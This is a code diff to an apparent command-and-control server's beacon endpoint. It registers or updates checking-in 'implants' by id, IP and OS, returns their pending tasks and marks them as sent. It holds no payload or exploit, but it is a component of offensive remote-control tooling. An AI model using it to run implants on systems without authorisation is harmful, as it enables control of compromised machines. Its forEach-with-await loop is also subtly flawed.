@@ -3,6 +3,15 @@ const router = express.Router();
 const statusCodes = require("../config/statusCodes");
 const logger = require("../utils/logger");
 const { validateBeacon } = require("../validation/request-validation");
+const {
+  findImplantById,
+  addImplant,
+  updateImplant,
+} = require("../db/services/implant-service");
+const {
+  getTasksForImplant,
+  taskSent,
+} = require("../db/services/tasks-service");
 
 router.post("", async (req, res) => {
   logger.log(
@@ -12,15 +21,46 @@ router.post("", async (req, res) => {
   );
   let returnStatus = statusCodes.OK;
   let responseJSON = {}; // TODO make the response DTOs into their own classes
-  if (validateBeacon(req.body)) {
+
+  try {
+    if (validateBeacon(req.body)) {
+      const beacon = {
+        id: req.body.id,
+        ip: req.body.ip,
+        os: req.body.os,
+        beaconIntervalSeconds: req.body.beaconIntervalSeconds,
+        lastCheckinTimeSeconds: Date.now(),
+      };
+
+      if ((await findImplantById(beacon.id)) === null) {
+        await addImplant(beacon);
+      } else {
+        await updateImplant(beacon);
+      }
+
+      const tasks = await getTasksForImplant(beacon.id, false);
+      responseJSON = {
+        tasks,
+        errors: [],
+      };
+
+      await tasks.forEach(async (task) => {
+        await taskSent(task._id);
+      });
+    } else {
+      responseJSON = {
+        tasks: [],
+        errors: ["Validation Error"],
+      };
+      returnStatus = statusCodes.BAD_REQUEST;
+    }
+  } catch (err) {
+    returnStatus = statusCodes.INTERNAL_SERVER_ERROR;
     responseJSON = {
-      message: "Success",
+      tasks: [],
+      errors: ["Internal Server Error"],
     };
-  } else {
-    responseJSON = {
-      message: "Validation Error",
-    };
-    returnStatus = statusCodes.BAD_REQUEST;
+    logger.log("/beacon", err, logger.levels.ERROR);
   }
   return res.status(returnStatus).json(responseJSON);
 });
